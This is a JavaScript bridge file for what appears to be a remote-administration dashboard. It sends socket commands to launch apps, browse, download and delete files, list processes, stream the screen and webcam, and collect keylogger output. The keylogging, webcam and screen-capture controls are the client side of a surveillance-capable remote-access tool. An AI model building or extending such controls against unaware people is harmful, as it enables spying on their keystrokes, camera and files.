/**
 * GLOBAL BRIDGE
 * Export các function ra global scope để HTML onclick có thể gọi được
 */

import { SocketService } from '../services/socket.js';
import { UIManager } from './ui.js';

// --- COMMAND SENDER ---
window.sendCommand = function(command, param = "") {
    SocketService.send(command, param);
};

// Alias
window.sendCmd = window.sendCommand;

// --- DASHBOARD FEATURES ---
window.startApp = function() {
    const input = document.getElementById("quickAppInput");
    const appName = input?.value.trim();
    if (appName) {
        SocketService.send("START_APP", appName);
        input.value = "";
        UIManager.showToast(`Starting ${appName}...`, "info");
    } else {
        UIManager.showToast("Please enter app name!", "error");
    }
};

window.openWeb = function(url) {
    SocketService.send("START_APP", url);
    UIManager.showToast(`Opening ${url}...`, "info");
};

window.browseApps = function() {
    document.getElementById("app-library-modal")?.classList.remove("hidden");
    SocketService.send("GET_INSTALLED");
};

window.closeAppLibrary = function() {
    document.getElementById("app-library-modal")?.classList.add("hidden");
};

window.filterApps = function() {
    const keyword = document.getElementById("appSearch")?.value.toLowerCase() || "";
    // Trigger event để các module xử lý
    window.dispatchEvent(new CustomEvent('filterApps', { detail: { keyword } }));
};

// --- FILE MANAGER ---
// Import dynamically to avoid circular dependency
let FileManagerFeature = null;
import('../features/fileManager.js').then(module => {
    FileManagerFeature = module.FileManagerFeature;
}).catch(err => {
    console.error('Failed to load FileManagerFeature:', err);
});

window.getDrives = function() {
    if (FileManagerFeature) {
        FileManagerFeature.getDrives();
    } else {
        // Fallback - send command directly
        console.log('FileManagerFeature not loaded yet, using fallback');
        SocketService.send("GET_DRIVES");
    }
};

window.openFolder = function(path) {
    if (FileManagerFeature) {
        FileManagerFeature.openFolder(path);
    } else {
        // Fallback - send command directly
        console.log('FileManagerFeature not loaded yet, using fallback');
        SocketService.send("GET_DIR", path);
    }
};

window.reqDownloadFile = function(path) {
    if(confirm("Download this file?")) {
        SocketService.send("DOWNLOAD_FILE", path);
    }
};

window.reqDeleteFile = function(path) {
    if(confirm("PERMANENTLY DELETE this file?")) {
        SocketService.send("DELETE_FILE", path);
        setTimeout(() => {
            const currentPath = document.getElementById("current-path")?.textContent;
            if(currentPath && currentPath !== "My Computer") {
                window.openFolder(currentPath);
            }
        }, 1000);
    }
};

// --- TASK MANAGER ---
window.getApps = function() {
    SocketService.send("GET_APPS");
};

window.getProcesses = function() {
    SocketService.send("GET_PROCESS");
};

// --- WEBCAM ---
/**
 * Toggle Webcam ON/OFF (New unified function)
 */
window.toggleWebcam = function() {
    WebcamFeature.toggleWebcam();
};

/**
 * Start recording webcam
 */
window.startRecordWebcam = function() {
    WebcamFeature.startRecording();
};

/**
 * Cancel recording webcam
 */
window.cancelRecordWebcam = function() {
    WebcamFeature.cancelRecording();
};

// --- WEBCAM DISPLAY CONTROLS ---
/**
 * Webcam zoom controls
 */
window.webcamZoom = function(action) {
    WebcamFeature.zoom(action);
};

/**
 * Toggle fit mode
 */
window.webcamToggleFit = function() {
    WebcamFeature.toggleFitMode();
};

/**
 * Fullscreen toggle
 */
window.webcamFullscreen = function() {
    WebcamFeature.toggleFullscreen();
};

// --- KEYLOGGER ---
window.clearAllKeylogs = function() {
    document.getElementById("raw-key-output").innerHTML = "";
    document.getElementById("keylogger-editor").value = "";
    UIManager.showToast("Keylogs cleared", "success");
};

window.downloadLog = function() {
    const content = document.getElementById("keylogger-editor")?.value;
    if (!content) return UIManager.showToast("Log is empty!", "error");
    
    const blob = new Blob([content], { type: "text/plain;charset=utf-8" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = `Keylog_${Date.now()}.txt`;
    a.click();
    setTimeout(() => URL.revokeObjectURL(url), 100);
    UIManager.showToast("Downloaded!", "success");
};

// --- MONITOR ---
// Import MonitorFeature để gọi toggleMonitor
import { MonitorFeature } from '../features/monitor.js';
import { WebcamFeature } from '../features/webcam.js';

window.toggleMonitor = function() {
    MonitorFeature.toggleMonitor();
};

window.stopMonitor = function() {
    // Gửi lệnh STOP_STREAM tới server
    SocketService.send('STOP_STREAM');
    
    // Reset giao diện về trạng thái ban đầu
    const img = document.getElementById("live-screen");
    const placeholder = document.getElementById("screen-placeholder");
    const status = document.getElementById("monitorStatus");

    if (img) {
        img.style.display = "none";
        img.src = "";  // Clear src để giải phóng bộ nhớ
    }
    
    if (placeholder) {
        placeholder.style.display = "flex";
    }
    
    if (status) {
        status.innerText = "Ready";
    }
    
    UIManager.showToast("Stream stopped", "info");
};

// --- MONITOR DISPLAY CONTROLS ---
window.monitorZoom = function(action) {
    MonitorFeature.zoom(action);
};

window.monitorToggleFit = function() {
    MonitorFeature.toggleFitMode();
};

window.monitorFullscreen = function() {
    MonitorFeature.toggleFullscreen();
};

// --- WEBCAM DISPLAY CONTROLS ---
window.webcamZoom = function(action) {
    WebcamFeature.zoom(action);
};

window.webcamToggleFit = function() {
    WebcamFeature.toggleFitMode();
};

window.webcamFullscreen = function() {
    WebcamFeature.toggleFullscreen();
};

window.viewFullImage = function(imgElement) {
    const w = window.open("");
    w.document.write(`<img src="${imgElement.src}" style="width:100%">`);
};

console.log("✅ Global Bridge Loaded - All onclick functions available");
